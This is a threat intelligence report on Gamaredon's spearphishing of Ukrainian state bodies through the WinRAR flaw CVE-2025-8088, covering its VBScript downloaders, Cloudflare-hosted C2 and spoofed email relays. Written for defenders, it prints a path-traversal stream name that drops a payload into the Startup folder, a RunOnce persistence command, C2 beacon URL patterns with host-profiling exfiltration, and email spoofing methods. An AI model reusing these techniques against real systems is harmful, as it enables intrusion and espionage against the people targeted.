_Identifier: TRR260501._

**Summary**

Investigating Gamaredon’s abuse of CVE-2025-8088, we identified a dozen waves of spearphishing emails against Ukrainian state institutions in a campaign that is still active, dating back to September 2025. These emails – spoofed or sent from compromised government accounts – deliver persistent, multi-stage VBScript downloaders that profile the infected system.

In the absence of public analysis of these malware, this report documents Gamaredon’s _GammaDrop_ and _GammaLoad_ downloader variants, the infrastructure behind them, and the methods used to deliver the spearphishing emails.

Both variants function as downloaders, while GammaLoad additionally established persistence and beacons victim data to the C2 server, enabling the operator to selectively deliver a tailored payload. The supporting infrastructure combines Cloudflare Workers domains, fast flux DNS, dynamic DNS providers, and attacker-controlled email relays – all constantly evolving.

## Background: active CVE-2025-8088 exploitation

_Gamaredon_ , also known as [_Aqua Blizzard_](https://learn.microsoft.com/en-us/unified-secops/microsoft-threat-actor-naming), [_Primitive Bear_](https://www.crowdstrike.com/en-us/adversaries/primitive-bear/), [_Shuckworm_](https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel) or [_UAC-0010_](https://cert.gov.ua/article/18365), has been exploiting [CVE-2025-8088](https://www.win-rar.com/singlenewsview.html?L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5) to target Ukrainian organizations. This path traversal vulnerability [documented by ESET](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/) has been [leveraged by multiple threat actors](https://cloud.google.com/blog/topics/threat-intelligence/exploiting-critical-winrar-vulnerability) since the summer of 2025, and Gamaredon is known to have been using it since at least [September 2025](https://x.com/i/status/1971564401724670158).

## Infection chain

### Spearphishing

This example spearphishing email was sent from a compromised email account belonging to a local government official in Odessa Oblast on March 18th, 2026. The email sender and recipient addresses are the same, with the targets of the phishing attempt hidden in the BCC field.

![Figure 1 - Spearphishing email sent from compromised account](https://harfanglab.io/medias/2026/05/figure-1-email-cen.png)

The email’s body, written in Ukrainian, translates to:
    
    
    Case number: 2/1369-26 
    Incoming application date: 07.02.2026 
    Judge-rapporteur on the case: Skrypka A.N. 
    Document: Court summons for appearance in court 
    Document date: 18.03.2026
    

Analyzing the email headers we could see it originated from the government official’s Exchange servers and was likely transmitted to an email address in `ukr.net`, according to the second-to-last hop’s FQDN (`frv72.fwdcdn.com`), which belongs to their MX infrastructure, also confirmed by `ukr.net` custom email header `X-Ukrnet-Yellow: 0`.

### Malicious attachment

The email contains a RAR archive as an attachment `Судова_повістка_1_13_4_1882_18.03.2026.rar` (SHA256 `1e57e3c3225afcd4eece2f2dec9ac7f4a181a2681c3b8a56b831046aa8277007`) that exploits [CVE-2025-8088](https://nvd.nist.gov/vuln/detail/CVE-2025-8088), a WinRAR directory traversal vulnerability (up to v7.13).

The archive contains a single file entry accompanied by an NTFS alternate data stream (ADS) service record[[1]](https://hedgedoc.huruk.ai/wBnhb9p-RtyRd-dPa0IGgA?both#fn1):

  * `Судова_повістка_1_13_4_1882_18.03.2026.pdf` (SHA256 `947890fb467e39b4cf47f1873f81434d689d8d05d11c1d46333d7c3cd84201ae`): a decoy file with a `.pdf` extension, containing random ASCII characters. Not referenced by any script, it serves as the visible file the victim sees upon extraction.
  * `1_13_4_1882_18.03.2026.vbs` (SHA256 `62818ae5e305b89b9461536dac1b9daf4cebd99d24e417357e27e2ae4582a704`): The VBS payload, GammaDrop, stored as an ADS of the PDF. The stream name contains a path traversal sequence that, upon extraction, causes WinRAR to write the VBS payload to the Windows Startup folder: `Судова_повістка_1_13_4_1882_18.03.2026.pdf:..\..\..\..\..\..\AppData\Roaming\Microsoft\Windows\..\..\Microsoft\Windows\Start Menu\Programs\..\Programs\..\Programs\Startup\1_13_4_1882_18.03.2026.vbs`.



Upon extraction, the PDF is written normally, while the ADS entry’s path traversal causes WinRAR to resolve the stream name as a file path, writing the VBS payload to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`, achieving persistence via the `Startup` folder.

Gamaredon uses a unique, redundant path traversal pattern. The convoluted `\Programs\..\Programs\..\Programs\` sequence appears to bypass WinRAR path traversal mitigations.

## GammaDrop – 1st stage

Filename | `1_13_4_1882_18.03.2026.vbs`  
---|---  
Filesize | 78KB  
Hash (SHA-256) | `62818ae5e305b89b9461536dac1b9daf4cebd99d24e417357e27e2ae4582a704`  
  
This heavily obfuscated VBS payload fetches a remote HTA (GammaLoad) from a Cloudflare Workers C2 server, drops it to `%TEMP%\brushedGpI.hta`, and executes it. The script uses randomized variable names, junk functions and string building techniques consistent with Gamaredon’s auto-generated tooling.

Each sample is parameterized per campaign. The following parameters are used to construct the next stage URL:

Parameter | Value  
---|---  
Base URL | `hxxps://throbsuns2.h4puonhajw.workers[.]dev`  
Campaign ID | `DvvsUa-18-03`  
URI Path | `knife/bennet/juice`  
Date-derived value | `Eval(FormatDateTime(Now(), vbShortDate))` – e.g. `18.03.2026` with a Ukrainian locale[[2]](https://hedgedoc.huruk.ai/wBnhb9p-RtyRd-dPa0IGgA?both#fn2)  
Suffix | `admiration`  
Random integer | `Int((181842 * Rnd) + 39)` — random number between 39 and 181880  
Extension | `.tif`  
  
Producing a URL with the following structure:
    
    
    hxxps://throbsuns2.h4puonhajw.workers[.]dev/<campaign ID>/<URI path>/<date>/<suffix><rand>.<extension>
    

The malware also contains a Cloudflare quick tunnel URL artifact, in a function that fails execution due to a missing shell object: `hxxps://bed-office-original-bytes.trycloudflare[.]com`.

The URL structure is consistent across the GammaDrop samples we analyzed. For example, a more recent wave from April 27, 2026 (SHA256 `be05c74c5ed62be987bbd868c51ab8828d2d5cb37b128d7e3d38f676591a233f`) uses:
    
    
    hxxp://thre6d.rfgah07ggr.workers[.]dev/<campaign ID>/<URI path>/<date>/<suffix><rand>.<extension>
    

Parameter | Value  
---|---  
Base URL | `hxxps://thre6d.rfgah07ggr.workers[.]dev`  
Campaign ID | `MouBig-27-04`  
URI Path | `confer`  
Date-derived value | `FormatDateTime(Now(), vbShortDate)` – e.g. `27.04.2026` in Ukrainian locale  
Suffix | `employee`  
Random integer | `Int((383901 * Rnd) + 44)` — random number between 44 and 383945  
Extension | `.bmp`  
  
In some cases, we observed the RAR archives skip GammaDrop entirely and deploy GammaLoad directly.

## GammaLoad – 2nd stage

Filename | `brushedGpI.hta`  
---|---  
Filesize | 287KB  
Hash (SHA-256) | `69cdde1ec82099a471283de89dd5e17266b1d8dda57d3c1589b7754b009fa2ed`  
  
Executed by GammaDrop via `Wscript.Shell.Run`, which launches `mshta.exe` in a hidden window. This file contains a two-layered VBScript malware wrapped inside an HTML script:
    
    
    <!DOCTYPE html>
    <html>
    <head>
    <script type="text/vbscript">
    on error resume next
    ...
    </script>
    </head>
    <body>
    </body>
    </html>
    

The obfuscated VBScript spans roughly 4,000-5,000 lines, which reduce to approximately 130 after deobfuscation. Its purpose is to serve as a persistent C2 beacon that profiles the infected host, downloads a next-stage payload, and executes it.

### Outer layer (Installer)

Decodes a Base64-encoded blob and writes it to disk at `%TEMP%\casto0O.icl`. Establishes persistence via a _RunOnce_ registry key:
    
    
    Key: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\integralXk3
    Value:
    wscript %TEMP%\casto0O.icl /ridiculousGBC /arithmeticpSR /seenLz7 //b //e:vbscript /brotherPo5
    

Then executes the payload:
    
    
    wscript %TEMP%\casto0O.icl /ridiculousGBC /arithmeticpSR /seenLz7 //b //e:vbscript /brotherPo5
    

### Inner layer (C2 beacon)

The Base64-encoded payload decodes to an obfuscated VBScript that collects host information and beacons it to a set of C2 servers, awaiting a payload for execution.

It collects the following information from the infected host:

  * Computer name: Retrieves `%COMPUTERNAME%` via `ExpandEnvironmentStrings`
  * System drive: Retrieves `%SYSTEMDRIVE%` via `ExpandEnvironmentStrings`
  * Volume serial number: Queries via WMI (`Select VolumeSerialNumber from Win32_LogicalDisk Where DeviceID = '<%SYSTEMDRIVE%>'`), falling back to `Scripting.FileSystemObject.GetDrive().SerialNumber`



#### C2 Communications

The implant is configured with two C2 servers. The primary and fallback use different URL structures:

  * Primary: `hxxps://a.cnbyvilkghx2a6p.workers[.]dev`, Cloudflare Workers proxy
  * Fallback: `hxxps://<random>@kosoyed[.]ru`, RU domain, also behind Cloudflare



**Primary C2**

Each beacon iteration generates a fresh URL:
    
    
    hxxps://a.cnbyvilkghx2a6p.workers[.]dev/<random_string>.<random_extension>
    

Where:

  * `<random_string>` = 6-10 random alphanumeric characters (`a-z0-9`)
  * `<random_extension>` = randomly selected from: `cfl`, `fits`, `mov`, `fff`, `icm`



The victim’s identity and check-in time are embedded in the `User-Agent` header, alongside a standard browser string:

Segment | Description  
---|---  
`Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36` | Chrome 83 on Windows 8.1  
`::` | Delimiter separating browser string from beacon data  
`<COMPUTERNAME>_<SERIAL>` | Unique victim identifier (e.g. `WORKSTATION01_A30BDCA3`)  
`::` | Second delimiter  
`/.v<datetime>/.` | Timestamp of this beacon check-in (e.g. `/.v4/7/2026 4:19:00 PM/.`)  
  
The implant uses `MSXML2.XMLHTTP`, which relies on WinINet. The malware sets a `Cookie` header (`statementdMg`) and a `Content-Length` header (`22106`), but both are silently dropped – the cookie due to a known [WinINet bug](https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies), and the content length because `MSXML2.XMLHTTP.send` recalculates it from the (empty) GET body. WinINet also adds its own default headers (`Accept`, `Accept-Language`, `UA-CPU`, `Accept-Encoding`, `Connection`).

The resulting complete request:
    
    
    GET /k8f2ma.mov HTTP/1.1
    Accept: */*
    user-agent: Mozilla/5.0 (Windows NT 6.3; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36::WORKSTATION01_A30BDCA3::/.v4/7/2026 4:19:00 PM/.
    Accept-Language: <country-lang>
    UA-CPU: <arch>
    Accept-Encoding: gzip, deflate
    Host: a.cnbyvilkghx2a6p.workers[.]dev
    Connection: Keep-Alive
    

**Fallback C2**

The fallback C2 URL is constructed as `hxxps://<random_string>.<random_extension>@kosoyed[.]ru`. However, the _userinfo_ component (e.g. `k8f2ma.mov@`) is not transmitted by `MSXML2.XMLHTTP`, resulting in plain GET / request to `kosoyed[.]ru` with the same `User-Agent` beacon. The default WinINet headers are added as above.

**Beacon loop**

The malware runs in an infinite loop, sleeping ~3.5 minutes between iterations. It contacts the primary C2 first, checking whether the response body exceeds 75 characters. If the body is too short or the server responds with _HTTP 404_ , it sleeps 10 seconds and falls back to the secondary C2.

Once a payload is received, it is executed within the same `wscript.exe` process via VBScript’s _Execute_ statement.

### Variants

A more recent GammaLoad variant (April 27, 2026, SHA256 `92aaeb49888fa8c392ac088b2a104675c9fd0eaa081ccf1024d0452b67b782a2`) displays the following changes from the sample analyzed above:

Segment | Description  
---|---  
`mozilla/5.0 (macintosh; intel mac os x 10_15_6) applewebkit/605.1.15 (khtml, like gecko) version/14.0 safari/605.1.15` | Safari 14 on macOS 10.15.6  
`;;` | Separating delimiters (previously `::`)  
`<COMPUTERNAME>@<SERIAL>` | Unique victim identifier separator changed from `_` to `@`  
`/.wsntimidate/.` | Static string replacing the beacon timestamp  
  
This variant is configured with a single C2 (`hxxps://heart7766.vmkyieebw2.workers[.]dev/snstead/wordpress.php=?<rand 1-1000>`) and no fallback. It adds a `Referer: https://t.me/` header, limits execution to 5 iterations, and obtains the volume serial via FSO (`Scripting.FileSystemObject.GetDrive().SerialNumber` converted to hex) rather than WMI.

Gamaredon’s tooling is auto-generated and parameterized per wave, producing samples that vary in their communication parameters with superficial code changes that preserve the same underlying functionality: download and execute the next stage. However, the payload delivered via GammaLoad appears to be operator-controlled and is not automatically served.

## Spearphishing campaigns

The earliest email we identified exploiting CVE-2025-8088 dates back to September 26, 2025 (SHA256 `d6476b2cee21f01e3c545d0355a0730efd9ac4a2821a08eac68da05b0bb3e716`). Since then, we identified 12 waves of spearphishing emails, the most recent on April 29, 2026. Sent at a roughly monthly cadence, the dropped payloads evolved over time – early waves delivered HTA files, shifting to VBScript (`.vbs`) in March 2026 and VBScript masquerading as encoded VBScript (`.vbe` extension) by late April.

These emails originated from compromised governmental, law enforcement, and justice system accounts. A subset of emails was spoofed through relay infrastructure, detailed below.

### Gamaredon Relay servers and email setup

The spoofed emails share a common pattern: the operator connects from an IP in the `194.58.66.0/24` subnet, authenticates with stolen credentials, and sends an email whose `From:` header impersonates a Ukrainian government entity while the envelope sender reveals the true authenticated account. The operator consistently used randomized HELO strings rather than valid hostnames.

The success of these spoofed emails is largely due to missing or weak email authentication on the impersonated domains. Several lack SPF and DMARC records entirely, meaning any server can send on their behalf with nothing to catch the mismatch. Others publish DMARC set to quarantine rather than reject spoofed emails. Even where checks exist, SPF validates the envelope sender rather than the `From:` header, and DKIM signs for the relay domain – so both pass for the attacker’s infrastructure. DMARC is the mechanism that could catch the `From:` mismatch, but only where it exists and is enforced.

#### `194.58.66[.]53` – Persistent operator IP

This IP (`194.58.66[.]53`) appears across multiple email samples spanning four months (December 2025 to April 2026), connecting as an SMTP client to two different relay chains:

  * **`relay.astrocaf[.]com` (December 2025):** The operator sent a spoofed email impersonating the office of the prosecutor general, with envelope sender `test@astrocaf.com`, targeting a Ukrainian justice entity with a `ukr.net` email address. The relay server `relay.astrocaf[.]com` resolves to a neighbouring IP, `194.58.66[.]82`, suggesting both addresses are attacker controlled.  
The recipient infrastructure detected the mismatch: SPF passed for `astrocaf[.]com` (not `gp.gov[.]ua`), DKIM was absent, and DMARC failed. However, because `gp.gov[.]ua`’s DMARC policy was set to _quarantine_ rather than _reject_ , the email was still delivered — scored as `X-Ukrnet-Yellow: 64` (where `0` is clean), but not blocked.

  * **`freehost.com[.]ua` (April 2026):** The operator authenticated to the legitimate hosting service `freehost.com[.]ua` using stolen credentials of a Ukrainian city council mayor’s office. Three emails were sent to a sanatorium associated with the SSU: one spoofed as Ukraine’s CourtID, and two as Ukraine’s NABU (National Anti-Corruption Bureau). All passed the SPF check but lacked DKIM signature. No DMARC checks were performed, as neither of the impersonated domains published a DMARC record.




#### `194.58.66[.]106` – September 2025 relay

In early September 2025, this client IP (`194.58.66[.]106`) relayed spoofed emails through `relay.hvosting[.]ua`, authenticating with stolen credentials of an Ukrainian city council. The emails were spoofed as Ukraine’s Military Prosecution and a member of parliament, both targeting the SSU. Here the randomized HELO strings returned `SPF_HELO_NONE` (no SPF record published for the gibberish hostname) and the envelope-from check returned `SPF_SOFTFAIL`, but neither was enough to trigger rejection, as the relay carried a strong sender reputation score which offset them.

#### `194.58.66[.]139` – August 2025 relay

In August, this client IP (`194.58.66[.]139`) relayed spoofed emails as CourtID targeting the SSU, via `tzk701.nic[.]ua` and `h64.hvosting[.]ua`, authenticated with different compromised Ukrainian IT consulting companies’ accounts.

#### Hijacked domain – `joymobile.com[.]ua`

Between October and November 2025, the operator sent multiple spoofed emails through `mail.c1.com[.]ua` (`5.9.241[.]27`), a legitimate shared hosting mail relay, using the account `vodafonenovic33@joymobile.com[.]ua`.

`joymobile.com[.]ua` is a parked domain that previously belonged to a small mobile phone [retailer](https://youcontrol.market/catalog/47.42/zaporizka-oblast) in partially occupied Zaporizhzhia, registered on July 20, 2020 via Ukrnames. Historical WHOIS records show the domain was modified on July 17, 2025, when the attacker added the MX and permissive SPF records (`mail.c1.com.ua`, `v=spf1 ip4:5.9.241.27 ~all`). We assess this was done through the domain owner’s compromised Ukrnames account.

By hijacking a 5 year old domain, the operator passes SPF and DKIM checks and scored a completely clean rating. Emails were spoofed as Kyiv court, NABU, and various Ukrainian military units, targeting the SSU.

### Shift to ARJ archives – May 2026

As this report was being finalized, we observed three additional waves on May 5, 7 and 8, 2026, in which the actor switched from RAR to ARJ archives disguised with a `.rar` or `.zip` extension. The archives deliver GammaDrop HTA payloads functionally identical to those analyzed above, fetching the next stage from Cloudflare Workers, Cloudflare quick tunnels, or a new standalone C2 domain (`rubakovox[.]pro`). The campaign IDs embedded in the samples they contain – such as `ProbArjDev-08-05`, `GisArjUkr-07-05` and `arjCF-05-05` – explicitly reference the new format, and their User-Agent strings have also shifted from browser impersonation to bot strings (Bingbot, Google AdsBot).

## Infrastructure

The infection chain uses three distinct Cloudflare-proxied hosts across its stages.

Stage | Domain | Details | Certificate | Purpose  
---|---|---|---|---  
Stage 1 | `throbsuns2.h4puonhajw.workers[.]dev` | Cloudflare Workers | Let’s Encrypt certificate issued `2026-03-16` | Delivers GammaLoad  
Stage 2 (primary) | `a.cnbyvilkghx2a6p.workers[.]dev` | Cloudflare Workers | Let’s Encrypt certificate issued `2026-03-23` | GammaLoad beacon, delivers stage 3  
Stage 2 (fallback) | `kosoyed[.]ru` | Registered 2026-03-25 via [REG.RU](http://REG.RU) LLC, Cloudflare-proxied | Let’s Encrypt certificate issued `2026-03-26` | Fallback beacon, delivers stage 3  
  
Gammaredon uses Cloudflare Workers as an easy to setup, somewhat disposable, legitimate-looking infrastructure. Based on TLS certificates issuance dates, the infrastructure was provisioned shortly before a spearphishing campaign begins, with the second stage infrastructure being rotated a week later.

Pivoting from the fallback domains, we found a twin domain (`kosoyed[.]online`) registered on the same day via the same registrar, using the same Cloudflare nameserver pair. This dual TLD registration pattern (`.ru` and `.online`) is consistent across Gamaredon fallback C2 domains since at least September 2025:

Domain/IP | Registration info | Nameservers  
---|---|---  
`kosoyed[.]ru` | 2026-03-25, [REG.RU](http://REG.RU) | `doug.ns.cloudflare.com`, `fay.ns.cloudflare.com`  
`kosoyed[.]online` | 2026-03-25, [REG.RU](http://REG.RU) | `doug.ns.cloudflare.com`, `fay.ns.cloudflare.com`  
`uarefire[.]ru` | 2025-12-24, [REG.RU](http://REG.RU) | `harvey.ns.cloudflare.com`, `kimora.ns.cloudflare.com`  
`uarefire[.]online` | 2025-12-24, [REG.RU](http://REG.RU) | `harvey.ns.cloudflare.com`, `kimora.ns.cloudflare.com`  
`oclouds[.]ru` | 2025-11-18, [REG.RU](http://REG.RU) | `bob.ns.cloudflare.com`, `maisie.ns.cloudflare.com`  
`oclouds[.]online` | 2025-11-18, [REG.RU](http://REG.RU) | `bob.ns.cloudflare.com`, `maisie.ns.cloudflare.com`  
`antresolle[.]ru` | 2025-11-13, [REG.RU](http://REG.RU) | `amalia.ns.cloudflare.com`, `chuck.ns.cloudflare.com`  
`antresolle[.]online` | 2025-11-13, [REG.RU](http://REG.RU) | `amalia.ns.cloudflare.com`, `chuck.ns.cloudflare.com`  
`youaresilent[.]ru` | 2025-11-11, [REG.RU](http://REG.RU) | `alberto.ns.cloudflare.com`, `isla.ns.cloudflare.com`  
`youaresilent[.]online` | 2025-11-11, [REG.RU](http://REG.RU) | `alberto.ns.cloudflare.com`, `isla.ns.cloudflare.com`  
`yourrain[.]ru` | 2025-09-18, [REG.RU](http://REG.RU) | `coco.ns.cloudflare.com`, `colin.ns.cloudflare.com`  
`yourrain[.]online` | 2025-09-18, [REG.RU](http://REG.RU) | `coco.ns.cloudflare.com`, `colin.ns.cloudflare.com`  
  
As documented in our [previous report](https://harfanglab.io/insidethelab/gamaredons-pterolnk-analysis/), here too we found samples that leveraged `check-hosts[.]net` to resolve fast flux domains to their current IP address. Alongside these, several samples reference Dynamic DNS (DDNS) hostnames provided by _No-IP_ (`myvnc[.]com`, `sytes[.]net`, `ddnsking[.]com`, `bounceme[.]net`, `ddns[.]net`, and `3utilities[.]com`).

Notably, the IP addresses behind these domains – whether hardcoded or resolved – were each mapped to multiple malicious domains for a short time, usually a single day. This pattern enabled us to pivot to additional Gamaredon infrastructure, including further fast flux domains (see [Additional Gamaredon Domains](https://hedgedoc.huruk.ai/wBnhb9p-RtyRd-dPa0IGgA?both#additional-gamaredon-domains)).

## Targets

Historically, Gamaredon has maintained near exclusive focus on Ukraine since it first appeared in 2013, just months before Russia’s annexation of Crimea. Over a decade later, the targeting remains consistent. Every email in the analyzed dataset targets Ukrainian state institutions or individuals connected to them, spanning the state administration, security, justice and law enforcement sectors in Odesa, Sumy, Kirovohrad, Zaporizhzhia and Khmelnytskyi.

Based on the emails we collected, we observed that the Security Service of Ukraine (SSU) was the most heavily targeted institution, across different oblasts: Luhansk, Lviv and Chernivtsi. Gamaredon targeted regional directorates rather than the headquarters. The same pattern held for other institutions – small, provincial branches were targeted.

![Figure 2 - Observed targets' distribution in Ukraine](https://harfanglab.io/medias/2026/05/ukraine-oblasts-map-v11.png)

## Attribution: Targeting, tooling, and infrastructure align with Gamaredon

We attribute this activity to Gamaredon (UAC-0010) with high confidence, based on the combination of targeting, tooling and infrastructure with previously documented campaigns:

  * **Targeting:** Strong focus on Ukrainian state institutions – SSU, military units, courts and prosecutors – consistent with Gamaredon’s [targeting of Ukraine since 2013](https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf);
  * **Tooling:** Large, heavily obfuscated VBScript payloads (VBS, HTA) are a Gamaredon hallmark, [as we previously analyzed](https://harfanglab.io/insidethelab/gamaredons-pterolnk-analysis/);
  * **Delivery:** Spearphishing emails containing weaponized RAR archives exploiting CVE-2025-8088, reported by [ESET](https://x.com/ESETresearch/status/1971564401724670158);
  * **Infrastructure:** Rapidly rotating domains using a legitimate tunnel service (Cloudflare), paired with a static fallback domain, and leveraging `check-host.net` to resolve fast flux domains – all [previously documented in our analysis](https://harfanglab.io/insidethelab/gamaredons-pterolnk-analysis/).



Taken together, these attribution tokens leave little room for alternative attribution.

## Conclusion: High volume, low sophistication, limited detection

Gamaredon’s operational tempo remains high, with no sign of slowing down. The group’s auto-generated, mutable tooling enables rapid iteration and serves as a practical response to atomic detection techniques.

The infection chain itself is straightforward but effective. Emails sent from compromised government accounts pass all authentication checks, the CVE-2025-8088 exploit silently writes a payload to the Startup folder, and GammaLoad’s operators selectively serve more guarded payloads. There is little technical novelty here, but Gamaredon has never relied on sophistication. The group’s strength lies in its relentless operational tempo and scale.

On the defensive side, strict DMARC enforcement would have blocked a significant portion of the spoofed emails, and the `194.58.66[.]0/24` subnet – a persistent Gamaredon operational hub hosting SMTP clients, email relays, and historically documented [indicators](https://github.com/stamparm/maltrail/blob/master/trails/static/malware/apt_gamaredon-1.txt) – is a strong candidate for network level blocking.

Interestingly, while Gamaredon rapidly [adopted](https://x.com/ArielJT/status/1937192461727858900) NTFS alternative data streams in PteroLNK following [our analysis](https://harfanglab.io/insidethelab/gamaredons-pterolnk-analysis/), the ADS usage observed here is inherent to CVE-2025-8088 rather than a deliberate tooling decision. Nonetheless, their prior familiarity with the technique may have made them favor this exploit. We expect the group to further integrate ADS into their toolset in the future.
